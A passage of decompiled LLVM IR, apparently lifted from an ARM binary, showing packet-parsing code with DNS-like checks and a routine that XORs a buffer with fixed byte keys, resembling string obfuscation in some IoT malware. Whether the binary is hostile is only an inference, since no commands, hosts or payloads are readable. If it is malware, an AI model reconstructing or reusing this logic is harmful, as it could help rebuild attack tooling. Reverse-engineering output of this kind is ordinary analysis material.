  br i1 %v7_9684, label %dec_label_pc_9858.loopexit, label %dec_label_pc_968c

dec_label_pc_968c:                                ; preds = %dec_label_pc_962c
  %v2_968c = icmp eq i32 %v5_9680, 0
  store i1 %v2_968c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_968c, label %dec_label_pc_983c.backedge, label %dec_label_pc_9694

dec_label_pc_9694:                                ; preds = %dec_label_pc_968c
  %v0_9694 = load i32, i32* @r4, align 4
  %v1_9694 = add i32 %v0_9694, -152
  %v2_9694 = inttoptr i32 %v1_9694 to i32*
  %v3_9694 = load i32, i32* %v2_9694, align 4
  %v1_9698 = load i32, i32* @r6, align 4
  %v6_9698 = ashr i32 %v3_9694, %v1_9698
  store i32 %v6_9698, i32* %r3.global-to-local, align 4
  %v1_969c = urem i32 %v6_9698, 2
  %v2_969c = icmp eq i32 %v1_969c, 0
  store i1 %v2_969c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_969c, label %dec_label_pc_983c.backedge, label %dec_label_pc_96a4

dec_label_pc_96a4:                                ; preds = %dec_label_pc_9694
  store i32 %v2_9528, i32* %r0.global-to-local, align 4
  %v0_96a8 = load i32, i32* @r5, align 4
  store i32 %v0_96a8, i32* %r1.global-to-local, align 4
  store i32 2048, i32* @r2, align 4
  %v3_96b0 = trunc i32 %v0_96a8 to i8
  %v4_96b0 = call i32 @function_ab54(i32 %v2_9528, i8 %v3_96b0, i32 2048)
  store i32 %v2_9528, i32* %r1.global-to-local, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_96c0 = load i32, i32* @sl, align 4
  store i32 %v0_96c0, i32* %r0.global-to-local, align 4
  %v0_96c4 = load i32, i32* @r5, align 4
  %v6_96cc = call i32 @function_c40c(i32 %v0_96c0, i32 %v2_9528, i32 2048, i32 16384, i32 %v0_96c4, i32 %v0_96c4)
  store i32 %v6_96cc, i32* @r4, align 4
  %v0_96d4 = load i32, i32* @r7, align 4
  store i32 %v0_96d4, i32* @r0, align 4
  %v0_96d8 = call i32 @function_aab8()
  %v1_96dc = add i32 %v0_96d8, 17
  store i32 %v1_96dc, i32* %r0.global-to-local, align 4
  %v0_96e0 = load i32, i32* @r4, align 4
  %v3_96e0 = icmp ult i32 %v0_96e0, %v1_96dc
  %v9_96e0 = icmp eq i32 %v0_96e0, %v1_96dc
  store i1 %v9_96e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_96e0, label %dec_label_pc_983c.backedge, label %dec_label_pc_96e8

dec_label_pc_96e8:                                ; preds = %dec_label_pc_96a4
  store i32 %v2_9558, i32* @r0, align 4
  %v0_96ec = call i32 @function_aab8()
  store i32 %v0_96ec, i32* %r0.global-to-local, align 4
  %v3_96f0 = load i16, i16* %stack_var_-4288, align 2
  %v4_96f0 = sext i16 %v3_96f0 to i32
  store i32 %v4_96f0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* @lr, align 4
  %v0_96f8 = load i32, i32* @fp, align 4
  %v2_96f8 = add i32 %v0_96f8, %v0_96ec
  store i32 %v2_96f8, i32* %r2.global-to-local, align 4
  %v3_96fc = icmp eq i16 %v3_96f0, -1
  store i1 %v3_96fc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_9558, i32* @r7, align 4
  %v1_9704 = add i32 %v2_96f8, 5
  store i32 %v1_9704, i32* @r6, align 4
  br i1 %v3_96fc, label %dec_label_pc_970c, label %dec_label_pc_983c.backedge

dec_label_pc_970c:                                ; preds = %dec_label_pc_96e8
  store i32 %v4_970c, i32* %r3.global-to-local, align 4
  store i1 %v2_9710, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9710, label %dec_label_pc_983c.backedge, label %dec_label_pc_9718

dec_label_pc_9718:                                ; preds = %dec_label_pc_970c
  %v1_9718 = add i32 %v2_96f8, 1
  %v2_9718 = inttoptr i32 %v1_9718 to i16*
  %v3_9718 = load i16, i16* %v2_9718, align 2
  %div = udiv i16 %v3_9718, 256
  %v3_971c = zext i16 %div to i32
  %tmp112 = urem i16 %v3_9718, 256
  %v1_9720 = zext i16 %tmp112 to i32
  store i32 %v1_9720, i32* %r3.global-to-local, align 4
  %v4_9724 = mul nuw nsw i32 %v1_9720, 256
  %v5_9724 = or i32 %v4_9724, %v3_971c
  store i32 %v5_9724, i32* %r2.global-to-local, align 4
  %v7_9728 = icmp eq i32 %v5_9724, 16
  store i1 %v7_9728, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9728, label %dec_label_pc_9730, label %dec_label_pc_983c.backedge

dec_label_pc_9730:                                ; preds = %dec_label_pc_9718
  store i32 %v1_9704, i32* @r0, align 4
  %v0_9734 = call i32 @function_aab8()
  %v0_9738 = load i32, i32* @r5, align 4
  store i32 %v0_9738, i32* %r1.global-to-local, align 4
  store i32 %v0_9734, i32* %r2.global-to-local, align 4
  %v0_9740 = load i32, i32* @r6, align 4
  store i32 %v0_9740, i32* %ip.global-to-local, align 4
  %v2_9744 = ptrtoint i32* %stack_var_-4289 to i32
  store i32 %v2_9744, i32* %r0.global-to-local, align 4
  %v9_976818 = icmp eq i32 %v0_9738, %v0_9734
  store i1 %v9_976818, i1* %cpsr_z.global-to-local, align 1
  %v5_976c19 = icmp slt i32 %v0_9738, %v0_9734
  br i1 %v5_976c19, label %dec_label_pc_974c, label %dec_label_pc_9770

dec_label_pc_974c:                                ; preds = %dec_label_pc_9730, %dec_label_pc_9768.dec_label_pc_974c_crit_edge
  %v4_975c = phi i32 [ %v1_9764, %dec_label_pc_9768.dec_label_pc_974c_crit_edge ], [ %v0_9738, %dec_label_pc_9730 ]
  %v3_975c = phi i32 [ %v0_974c.pre, %dec_label_pc_9768.dec_label_pc_974c_crit_edge ], [ %v0_9740, %dec_label_pc_9730 ]
  %v2_974c = add i32 %v3_975c, %v4_975c
  %v3_974c = inttoptr i32 %v2_974c to i8*
  %v4_974c = load i8, i8* %v3_974c, align 1
  %v6_974c = zext i8 %v4_974c to i32
  %v7_9750 = icmp eq i8 %v4_974c, -64
  store i1 %v7_9750, i1* %cpsr_z.global-to-local, align 1
  %v1_9754 = add nuw nsw i32 %v6_974c, 1
  store i32 %v1_9754, i32* %r3.global-to-local, align 4
  br i1 %v7_9750, label %bb92, label %.thread

bb92:                                             ; preds = %dec_label_pc_974c
  %v2_9758 = add i32 %v3_975c, 1
  %v3_9758 = inttoptr i32 %v2_9758 to i8*
  %v4_9758 = load i8, i8* %v3_9758, align 1
  %v5_9758 = zext i8 %v4_9758 to i32
  store i32 %v5_9758, i32* %r3.global-to-local, align 4
  br label %.thread5

.thread:                                          ; preds = %dec_label_pc_974c
  %v2_975c = trunc i32 %v1_9754 to i8
  store i8 %v2_975c, i8* %v3_974c, align 1
  %v0_9760.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9760.pr, label %.thread..thread5_crit_edge, label %dec_label_pc_9768

.thread..thread5_crit_edge:                       ; preds = %.thread
  %v2_9760.pre = load i32, i32* %r3.global-to-local, align 4
  br label %.thread5

.thread5:                                         ; preds = %bb92, %.thread..thread5_crit_edge
  %v2_9760 = phi i32 [ %v2_9760.pre, %.thread..thread5_crit_edge ], [ %v5_9758, %bb92 ]
  %v1_9760 = load i32, i32* %r0.global-to-local, align 4
  %v3_9760 = add i32 %v1_9760, %v2_9760
  store i32 %v3_9760, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_9768

dec_label_pc_9768:                                ; preds = %.thread, %.thread5
  %v0_9764 = load i32, i32* %r1.global-to-local, align 4
  %v1_9764 = add i32 %v0_9764, 1
  store i32 %v1_9764, i32* %r1.global-to-local, align 4
  %v1_9768 = load i32, i32* %r2.global-to-local, align 4
  %v9_9768 = icmp eq i32 %v1_9764, %v1_9768
  store i1 %v9_9768, i1* %cpsr_z.global-to-local, align 1
  %v5_976c = icmp slt i32 %v1_9764, %v1_9768
  br i1 %v5_976c, label %dec_label_pc_9768.dec_label_pc_974c_crit_edge, label %dec_label_pc_9768.dec_label_pc_9770_crit_edge

dec_label_pc_9768.dec_label_pc_974c_crit_edge:    ; preds = %dec_label_pc_9768
  %v0_974c.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_974c

dec_label_pc_9768.dec_label_pc_9770_crit_edge:    ; preds = %dec_label_pc_9768
  %v0_9770.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_9770

dec_label_pc_9770:                                ; preds = %dec_label_pc_9768.dec_label_pc_9770_crit_edge, %dec_label_pc_9730
  %v0_9794 = phi i32 [ %v0_9770.pre, %dec_label_pc_9768.dec_label_pc_9770_crit_edge ], [ %v0_9740, %dec_label_pc_9730 ]
  %v1_9770 = add i32 %v0_9794, 2
  store i32 %v1_9770, i32* @r4, align 4
  %v1_9774 = add i32 %v0_9794, 11
  %v2_9774 = inttoptr i32 %v1_9774 to i8*
  %v3_9774 = load i8, i8* %v2_9774, align 1
  %v4_9774 = zext i8 %v3_9774 to i32
  store i32 %v4_9774, i32* %r2.global-to-local, align 4
  %v1_9778 = add i32 %v0_9794, 10
  %v2_9778 = inttoptr i32 %v1_9778 to i8*
  %v3_9778 = load i8, i8* %v2_9778, align 1
  %v4_9778 = zext i8 %v3_9778 to i32
  %v4_977c = mul nuw nsw i32 %v4_9774, 256
  %v5_977c = or i32 %v4_9778, %v4_977c
  %v3_9780 = mul i32 %v5_977c, 65536
  store i32 %v3_9780, i32* %r3.global-to-local, align 4
  %v3_9784 = mul nuw nsw i32 %v4_9778, 256
  %v1_9788 = add i32 %v0_9794, 12
  store i32 %v1_9788, i32* @r5, align 4
  %v5_9790 = or i32 %v3_9784, %v4_9774
  store i32 %v5_9790, i32* @r2, align 4
  %v1_9794 = add i32 %v0_9794, 13
  store i32 %v1_9794, i32* @r1, align 4
  store i32 %v1_9788, i32* @r0, align 4
  %v3_979c = call i32 @function_bfe0(i32 %v1_9788, i32 %v1_9794, i32 %v5_9790)
  %v0_97a0 = load i32, i32* @r8, align 4
  store i32 %v0_97a0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 2048, i32* @r2, align 4
  %v4_97ac = call i32 @function_ab54(i32 %v0_97a0, i8 0, i32 2048)
  store i32 %v4_97ac, i32* %r0.global-to-local, align 4
  %v0_97b0 = load i32, i32* @r4, align 4
  %v1_97b0 = add i32 %v0_97b0, 9
  %v2_97b0 = inttoptr i32 %v1_97b0 to i8*
  %v3_97b0 = load i8, i8* %v2_97b0, align 1
  %v4_97b0 = zext i8 %v3_97b0 to i32
  store i32 %v4_97b0, i32* %r2.global-to-local, align 4
  %v1_97b4 = add i32 %v0_97b0, 8
  %v2_97b4 = inttoptr i32 %v1_97b4 to i8*
  %v3_97b4 = load i8, i8* %v2_97b4, align 1
  %v4_97b4 = zext i8 %v3_97b4 to i32
  %v4_97b8 = mul nuw nsw i32 %v4_97b0, 256
  %v5_97b8 = or i32 %v4_97b4, %v4_97b8
  %v3_97bc = mul i32 %v5_97b8, 65536
  store i32 %v3_97bc, i32* %r3.global-to-local, align 4
  %v3_97c0 = mul nuw nsw i32 %v4_97b4, 256
  %v5_97c8 = or i32 %v3_97c0, %v4_97b0
  %v1_97cc = add nsw i32 %v5_97c8, -1
  store i32 %v1_97cc, i32* @r2, align 4
  %v0_97d0 = load i32, i32* @r8, align 4
  store i32 %v0_97d0, i32* %r0.global-to-local, align 4
  %v0_97d4 = load i32, i32* @r5, align 4
  store i32 %v0_97d4, i32* %r1.global-to-local, align 4
  %v3_97d8 = call i32 @function_ab04(i32 %v0_97d0, i32 %v0_97d4, i32 %v1_97cc)
  store i32 %v3_97d8, i32* %r0.global-to-local, align 4
  %v0_97dc = load i32, i32* @r4, align 4
  %v1_97dc = add i32 %v0_97dc, 3
  %v2_97dc = inttoptr i32 %v1_97dc to i8*
  %v3_97dc = load i8, i8* %v2_97dc, align 1
  %v4_97dc = zext i8 %v3_97dc to i32
  store i32 %v4_97dc, i32* %r1.global-to-local, align 4
  %v1_97e0 = add i32 %v0_97dc, 1
  %v2_97e0 = inttoptr i32 %v1_97e0 to i8*
  %v3_97e0 = load i8, i8* %v2_97e0, align 1
  %v4_97e0 = zext i8 %v3_97e0 to i32
  store i32 %v4_97e0, i32* %r2.global-to-local, align 4
  %v0_97e4 = load i32, i32* @r6, align 4
  %v1_97e4 = add i32 %v0_97e4, 2
  %v2_97e4 = inttoptr i32 %v1_97e4 to i8*
  %v3_97e4 = load i8, i8* %v2_97e4, align 1
  %v4_97e4 = zext i8 %v3_97e4 to i32
  store i32 %v4_97e4, i32* %r0.global-to-local, align 4
  %v1_97e8 = add i32 %v0_97dc, 2
  %v2_97e8 = inttoptr i32 %v1_97e8 to i8*
  %v3_97e8 = load i8, i8* %v2_97e8, align 1
  %v4_97e8 = zext i8 %v3_97e8 to i32
  %v3_97fc = mul nuw nsw i32 %v4_97e4, 256
  %v3_9800 = mul nuw nsw i32 %v4_97e8, 256
  %v5_980c = or i32 %v3_97fc, %v4_97e0
  store i32 %v5_980c, i32* %r2.global-to-local, align 4
  %v5_9810 = or i32 %v3_9800, %v4_97dc
  store i32 %v5_9810, i32* %r1.global-to-local, align 4
  store i32 2048, i32* %r3.global-to-local, align 4
  %v1_9818 = trunc i32 %v5_980c to i16
  %v2_9818 = load i32, i32* @r8, align 4
  %v4_9818 = add i32 %v2_9818, 2048
  %v5_9818 = inttoptr i32 %v4_9818 to i16*
  store i16 %v1_9818, i16* %v5_9818, align 2
  %v0_981c = load i32, i32* %r3.global-to-local, align 4
  %v1_981c = add i32 %v0_981c, 2
  store i32 %v1_981c, i32* %r3.global-to-local, align 4
  %v0_9820 = load i32, i32* %r1.global-to-local, align 4
  %v1_9820 = trunc i32 %v0_9820 to i16
  %v2_9820 = load i32, i32* @r8, align 4
  %v4_9820 = add i32 %v2_9820, %v1_981c
  %v5_9820 = inttoptr i32 %v4_9820 to i16*
  store i16 %v1_9820, i16* %v5_9820, align 2
  %v4_9824 = sext i8 %v5_9850107 to i32
  store i32 %v4_9824, i32* @r1, align 4
  %v0_9828 = load i32, i32* @r5, align 4
  store i32 %v0_9828, i32* @r0, align 4
  %v2_982c = load i32, i32* @r8, align 4
  %v3_982c = add i32 %v2_982c, 2052
  %v4_982c = inttoptr i32 %v3_982c to i8*
  store i8 %v5_9850107, i8* %v4_982c, align 1
  %v0_9830 = call i32 @function_aab8()
  %v1_9830 = trunc i32 %v0_9830 to i8
  store i32 %v0_9830, i32* %r0.global-to-local, align 4
  %v3_9834 = load i32, i32* @r8, align 4
  %v4_9834 = add i32 %v3_9834, 2053
  %v5_9834 = inttoptr i32 %v4_9834 to i8*
  store i8 %v1_9830, i8* %v5_9834, align 1
  br label %dec_label_pc_9858

dec_label_pc_9858.loopexit:                       ; preds = %dec_label_pc_983c.backedge, %dec_label_pc_962c, %dec_label_pc_94c0
  %v5_9850.lcssa = phi i8 [ %v5_9850106, %dec_label_pc_94c0 ], [ %v5_9850107, %dec_label_pc_962c ], [ %v5_9850, %dec_label_pc_983c.backedge ]
  %.pre = sext i8 %v5_9850.lcssa to i32
  br label %dec_label_pc_9858

dec_label_pc_9858:                                ; preds = %dec_label_pc_9858.loopexit, %dec_label_pc_9770
  %v5_985096 = phi i8 [ %v5_9850.lcssa, %dec_label_pc_9858.loopexit ], [ %v5_9850107, %dec_label_pc_9770 ]
  %v4_9868.pre-phi = phi i32 [ %.pre, %dec_label_pc_9858.loopexit ], [ %v4_9824, %dec_label_pc_9770 ]
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_985c = call i32 @function_82c0(i32 25)
  %v0_9860 = load i32, i32* @sl, align 4
  store i32 %v0_9860, i32* %r0.global-to-local, align 4
  %v1_9864 = call i32 @function_e720(i32 %v0_9860)
  store i32 %v4_9868.pre-phi, i32* %r3.global-to-local, align 4
  %v7_986c = icmp eq i8 %v5_985096, 11
  store i1 %v7_986c, i1* %cpsr_z.global-to-local, align 1
  %v1_9870 = load i32, i32* @r8, align 4
  %storemerge = select i1 %v7_986c, i32 0, i32 %v1_9870
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v3_9430, i32* @r4, align 4
  store i32 %v6_9430, i32* @r5, align 4
  store i32 %v9_9430, i32* @r6, align 4
  store i32 %v12_9430, i32* @r7, align 4
  store i32 %v15_9430, i32* @r8, align 4
  store i32 %v18_9430, i32* @sb, align 4
  store i32 %v21_9430, i32* @sl, align 4
  store i32 %v24_9430, i32* @fp, align 4
  store i32 %v27_9430, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v0_9830, { 1, 0 }
  uselistorder i32 %v4_97b0, { 1, 0, 2 }
  uselistorder i32 %v1_9788, { 1, 0, 2 }
  uselistorder i32 %v4_9774, { 1, 0, 2 }
  uselistorder i32 %v0_9794, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v1_9764, { 2, 1, 3, 0 }
  uselistorder i32 %v3_975c, { 1, 0 }
  uselistorder i32 %v0_9740, { 1, 0, 2 }
  uselistorder i32 %v0_9738, { 0, 2, 1, 3 }
  uselistorder i32 %v0_9734, { 1, 0, 2 }
  uselistorder i32 %v1_9720, { 1, 0 }
  uselistorder i32 %v0_96e0, { 1, 0 }
  uselistorder i1 %v7_9684, { 1, 0 }
  uselistorder i32 %v5_9680, { 1, 0, 2 }
  uselistorder i32 %v0_9674, { 1, 0, 2, 3 }
  uselistorder i32 %v1_9644, { 1, 0 }
  uselistorder i32 %v3_9630, { 1, 0 }
  uselistorder i32 %v0_9630, { 1, 0 }
  uselistorder i32 %v3_9848, { 1, 0 }
  uselistorder i32 %v1_9840, { 1, 0 }
  uselistorder i1 %v7_9594, { 1, 0 }
  uselistorder i32 %v3_9590, { 2, 1, 0, 3 }
  uselistorder i1 %v7_9578, { 2, 1, 0 }
  uselistorder i32 %v0_9578, { 1, 0 }
  uselistorder i8 %v5_9850107, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v3_9848102, { 1, 0 }
  uselistorder i32 %v1_9840101, { 1, 0 }
  uselistorder i32 %v2_9528, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v1_94e8, { 1, 0, 3, 2 }
  uselistorder i32 %v1_94b4, { 2, 1, 3, 0 }
  uselistorder i32 %v1_94b8, { 0, 3, 2, 1 }
  uselistorder i32 %v0_949c, { 2, 0, 1 }
  uselistorder i32 %v0_94a0, { 0, 3, 2, 1 }
  uselistorder i32 %v0_94a4, { 1, 0 }
  uselistorder i32 %v1_9484, { 1, 0 }
  uselistorder i32 %v1_947c, { 1, 2, 0 }
  uselistorder i32 %v0_947c, { 1, 0 }
  uselistorder i32 %v2_9480, { 1, 0 }
  uselistorder i32 %v1_94b821, { 1, 0, 2, 3 }
  uselistorder i32 %v2_9458, { 2, 3, 1, 0, 4, 5 }
  uselistorder i32 %v2_9454, { 1, 0, 2 }
  uselistorder i16* %stack_var_-2240, { 1, 0 }
  uselistorder i16* %stack_var_-4288, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i16 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 1, 20, 21, 0, 22, 23, 25, 24, 26, 27 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 13, 14, 0, 16, 17, 19, 18, 20 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 5, 4, 7, 6, 8, 9, 10, 11, 13, 12, 14, 15, 17, 16, 19, 18, 20, 22, 21, 23, 0, 24, 27, 26, 25, 29, 28, 34, 30, 31, 32, 33, 35 }
  uselistorder i32* %ip.global-to-local, { 2, 1, 3, 4, 5, 0, 6, 7, 8, 9 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 4, 2, 3, 20, 5, 6, 7, 8, 9, 10, 11, 22, 12, 16, 13, 14, 15, 0, 19, 17, 18, 21 }
  uselistorder i32 4128, { 2, 0, 1 }
  uselistorder i16 -1, { 1, 0 }
  uselistorder label %dec_label_pc_9858.loopexit, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9768, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %dec_label_pc_974c, { 1, 0 }
  uselistorder label %dec_label_pc_9614.dec_label_pc_9614_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_983c.backedge, { 6, 4, 5, 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_95bc, { 2, 0, 1 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %dec_label_pc_9578, { 1, 0 }
  uselistorder label %dec_label_pc_9498, { 1, 0 }
  uselistorder label %dec_label_pc_9470, { 1, 0 }
}

define i32 @function_9890(i32 %arg1) local_unnamed_addr {
dec_label_pc_9890:
  %v2_989c = load i32, i32* @global_var_1d4cc.131, align 4
  %v2_98a4 = call i32 @function_b950(i32 %v2_989c, i32 9)
  ret i32 %v2_98a4
}

define i32 @function_98b8(i16 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_98b8:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i16 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_98b8 = load i32, i32* @r4, align 4
  %v6_98b8 = load i32, i32* @r5, align 4
  %v9_98b8 = load i32, i32* @r6, align 4
  %v12_98b8 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 12, i32* %r0.global-to-local, align 4
  %sext = mul i32 %arg2, 16777216
  %v1_98c8 = sdiv i32 %sext, 16777216
  store i32 %v1_98c8, i32* @r4, align 4
  store i32 %arg3, i32* @r5, align 4
  %v1_98d0 = call i32 @function_c77c(i32 12)
  store i32 %v1_98d0, i32* @r6, align 4
  %v0_98d8 = load i32, i32* @r7, align 4
  store i32 %v0_98d8, i32* %r0.global-to-local, align 4
  %v0_98dc = load i32, i32* @r4, align 4
  %v1_98dc = trunc i32 %v0_98dc to i8
  %v3_98dc = add i32 %v1_98d0, 2
  %v4_98dc = inttoptr i32 %v3_98dc to i8*
  store i8 %v1_98dc, i8* %v4_98dc, align 1
  %v0_98e0 = load i32, i32* @r7, align 4
  %v1_98e0 = trunc i32 %v0_98e0 to i16
  %v2_98e0 = load i32, i32* @r6, align 4
  %v3_98e0 = inttoptr i32 %v2_98e0 to i16*
  store i16 %v1_98e0, i16* %v3_98e0, align 2
  %sext1 = mul i32 %v0_98d8, 65536
  %v1_98e4 = sdiv i32 %sext1, 65536
  %v2_98e4 = call i32 @function_c77c(i32 %v1_98e4)
  store i32 %v2_98e4, i32* %r0.global-to-local, align 4
  %v0_98e8 = load i32, i32* @r5, align 4
  store i32 %v0_98e8, i32* %r1.global-to-local, align 4
  %v0_98ec = load i32, i32* @r7, align 4
  store i32 %v0_98ec, i32* @r2, align 4
  %v1_98f0 = load i32, i32* @r6, align 4
  %v2_98f0 = add i32 %v1_98f0, 4
  %v3_98f0 = inttoptr i32 %v2_98f0 to i32*
  store i32 %v2_98e4, i32* %v3_98f0, align 4
  %sext2 = mul i32 %v0_98ec, 65536
  %v3_98f4 = sdiv i32 %sext2, 65536
  %v4_98f4 = call i32 @function_ab04(i32 %v2_98e4, i32 %v0_98e8, i32 %v3_98f4)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -19, i32* %lr.global-to-local, align 4
  store i32 -22, i32* %ip.global-to-local, align 4
  store i32 -34, i32* %r0.global-to-local, align 4
  %v1_99504 = load i32, i32* @r7, align 4
  %v3_99506 = icmp eq i32 %v1_99504, 0
  br i1 %v3_99506, label %dec_label_pc_9958, label %dec_label_pc_990c

dec_label_pc_990c:                                ; preds = %dec_label_pc_98b8, %dec_label_pc_990c.dec_label_pc_990c_crit_edge
  %v1_9914 = phi i32 [ %v1_9914.pre, %dec_label_pc_990c.dec_label_pc_990c_crit_edge ], [ -19, %dec_label_pc_98b8 ]
  %v2_9918 = phi i32 [ %v1_994c, %dec_label_pc_990c.dec_label_pc_990c_crit_edge ], [ 0, %dec_label_pc_98b8 ]
  %v0_990c = load i32, i32* @r6, align 4
  %v1_990c = add i32 %v0_990c, 4
  %v2_990c = inttoptr i32 %v1_990c to i32*
  %v3_990c = load i32, i32* %v2_990c, align 4
  %v2_9910 = add i32 %v3_990c, %v2_9918
  %v3_9910 = inttoptr i32 %v2_9910 to i8*
  %v4_9910 = load i8, i8* %v3_9910, align 1
  %v6_9910 = zext i8 %v4_9910 to i32
  %v2_9914 = xor i32 %v6_9910, %v1_9914
  %v1_9918 = trunc i32 %v2_9914 to i8
  store i8 %v1_9918, i8* %v3_9910, align 1
  %v0_991c = load i32, i32* @r6, align 4
  %v1_991c = add i32 %v0_991c, 4
  %v2_991c = inttoptr i32 %v1_991c to i32*
  %v3_991c = load i32, i32* %v2_991c, align 4
  %v0_9920 = load i32, i32* %r1.global-to-local, align 4
  %v2_9920 = add i32 %v0_9920, %v3_991c
  %v3_9920 = inttoptr i32 %v2_9920 to i8*
  %v4_9920 = load i8, i8* %v3_9920, align 1
  %v6_9920 = zext i8 %v4_9920 to i32
  %v1_9924 = load i32, i32* %ip.global-to-local, align 4
  %v2_9924 = xor i32 %v1_9924, %v6_9920
  %v1_9928 = trunc i32 %v2_9924 to i8
  store i8 %v1_9928, i8* %v3_9920, align 1
  %v0_992c = load i32, i32* @r6, align 4
  %v1_992c = add i32 %v0_992c, 4
  %v2_992c = inttoptr i32 %v1_992c to i32*
  %v3_992c = load i32, i32* %v2_992c, align 4
  %v0_9930 = load i32, i32* %r1.global-to-local, align 4
  %v2_9930 = add i32 %v0_9930, %v3_992c
  %v3_9930 = inttoptr i32 %v2_9930 to i8*
  %v4_9930 = load i8, i8* %v3_9930, align 1
  %v6_9930 = zext i8 %v4_9930 to i32
  %v1_9934 = load i32, i32* %r0.global-to-local, align 4
  %v2_9934 = xor i32 %v1_9934, %v6_9930
  %v1_9938 = trunc i32 %v2_9934 to i8
  store i8 %v1_9938, i8* %v3_9930, align 1
  %v0_993c = load i32, i32* @r6, align 4
  %v1_993c = add i32 %v0_993c, 4
  %v2_993c = inttoptr i32 %v1_993c to i32*
  %v3_993c = load i32, i32* %v2_993c, align 4
  %v0_9940 = load i32, i32* %r1.global-to-local, align 4
  %v2_9940 = add i32 %v0_9940, %v3_993c
  %v3_9940 = inttoptr i32 %v2_9940 to i8*
  %v4_9940 = load i8, i8* %v3_9940, align 1
  %v6_9940 = zext i8 %v4_9940 to i32
  %v1_9944 = load i32, i32* %r0.global-to-local, align 4
  %v2_9944 = xor i32 %v1_9944, %v6_9940
  %v1_9948 = trunc i32 %v2_9944 to i8
  store i8 %v1_9948, i8* %v3_9940, align 1
  %v0_994c = load i32, i32* %r1.global-to-local, align 4
  %v1_994c = add i32 %v0_994c, 1
  store i32 %v1_994c, i32* %r1.global-to-local, align 4
  %v1_9950 = load i32, i32* @r7, align 4
  %v9_9950 = icmp eq i32 %v1_994c, %v1_9950
  br i1 %v9_9950, label %dec_label_pc_9958, label %dec_label_pc_990c.dec_label_pc_990c_crit_edge

dec_label_pc_990c.dec_label_pc_990c_crit_edge:    ; preds = %dec_label_pc_990c
  %v1_9914.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_990c

dec_label_pc_9958:                                ; preds = %dec_label_pc_990c, %dec_label_pc_98b8
  store i32 ptrtoint (i32* @global_var_1d4d8.135 to i32), i32* %r1.global-to-local, align 4
  %v2_9964 = load i32, i32* @global_var_1d4d8.135, align 4
  store i32 %v2_9964, i32* %r0.global-to-local, align 4
  store i16 ptrtoint (i16* @global_var_1d4d1.136 to i16), i16* bitcast (i16** @global_var_1d4d0.133 to i16*), align 4
  %v1_9974 = load i32, i32* @r6, align 4
  %v2_9974 = add i32 %v1_9974, 8
  %v3_9974 = inttoptr i32 %v2_9974 to i32*
  store i32 0, i32* %v3_9974, align 4
  %v0_9978 = load i32, i32* @r6, align 4
  %v1_9978 = load i32, i32* %r1.global-to-local, align 4
  %v2_9978 = inttoptr i32 %v1_9978 to i32*
  store i32 %v0_9978, i32* %v2_9978, align 4
  %v0_997c = load i32, i32* @r6, align 4
  %v2_997c = add i32 %v2_9964, 8
  %v3_997c = inttoptr i32 %v2_997c to i32*
  store i32 %v0_997c, i32* %v3_997c, align 4
  store i32 %v3_98b8, i32* @r4, align 4
  store i32 %v6_98b8, i32* @r5, align 4
  store i32 %v9_98b8, i32* @r6, align 4
  store i32 %v12_98b8, i32* @r7, align 4
  ret i32 %v2_9964

; uselistorder directives
  uselistorder i32 %v1_994c, { 1, 2, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 0 }
  uselistorder label %dec_label_pc_990c, { 1, 0 }
}

define i32 @function_9994(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_99d4.dec_label_pc_99d4_crit_edge.lr.ph:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
